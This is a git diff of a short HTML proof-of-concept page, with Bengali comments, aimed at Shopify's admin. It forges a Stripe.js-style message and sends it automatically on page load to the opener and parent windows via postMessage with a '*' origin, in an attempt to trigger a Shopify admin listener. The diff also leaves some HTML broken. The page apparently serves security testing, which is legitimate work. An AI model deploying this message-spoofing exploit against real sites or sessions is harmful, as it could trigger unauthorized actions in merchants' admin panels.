@@ -1,20 +1,36 @@
 <!DOCTYPE html>
-<!DOCTYPE html>
-<html>
+<!DO
+<htm></htm>
+<head>
+    <title>Shopify Security PoC</title>
+</head>
 <body>
+    <h1>Security Vector Testing</h1>
     <script>
-        // স্ট্রাইপের মেসেজ ফরম্যাটের সাথে মিলিয়ে পেলোড তৈরি
-        const fakeStripePayload = {
-            type: "parent", 
-            sourceFrameId: "__privateStripeController5791", // আপনার কনসোল থেকে পাওয়া আইডি
-            __stripeJsV3: true
+        // শপিফাই স্ট্রাইপ লিসেনারকে ট্রিগার করার জন্য ফাইনাল পেলোড
+        const payload = {
+            type: "parent",
+            sourceFrameId: "__privateStripeController5791", 
+            __stripeJsV3: true,
+            action: "test_trigger"
         };
 
-        // শপিফাই অ্যাডমিনের লিসেনারকে মেসেজ পাঠানো
-        window.opener?.postMessage(fakeStripePayload, "*");
-        window.parent?.postMessage(fakeStripePayload, "*");
-        
-        console.log("✅ Fake Stripe payload dispatched!");
+        // শপিফাই অ্যাডমিনের প্যারেন্ট উইন্ডো বা ওপেনার উইন্ডোতে মেসেজ পাঠানো
+        // '*' ব্যবহার করা হয়েছে অরিজিন বাইপাস টেস্ট করার জন্য
+        function triggerExploit() {
+            if (window.opener) {
+                window.opener.postMessage(payload, "*");
+                console.log("✅ Payload sent to Opener");
+            }
+            if (window.parent) {
+                window.parent.postMessage(payload, "*");
+                console.log("✅ Payload sent to Parent");
+            }
+        }
+
+        // পেজ লোড হওয়ার সাথে সাথে যেন মেসেজটি অটোমেটিক যায়
+        setTimeout(triggerExploit,500);
     </script>
 </body>
 </html>
+
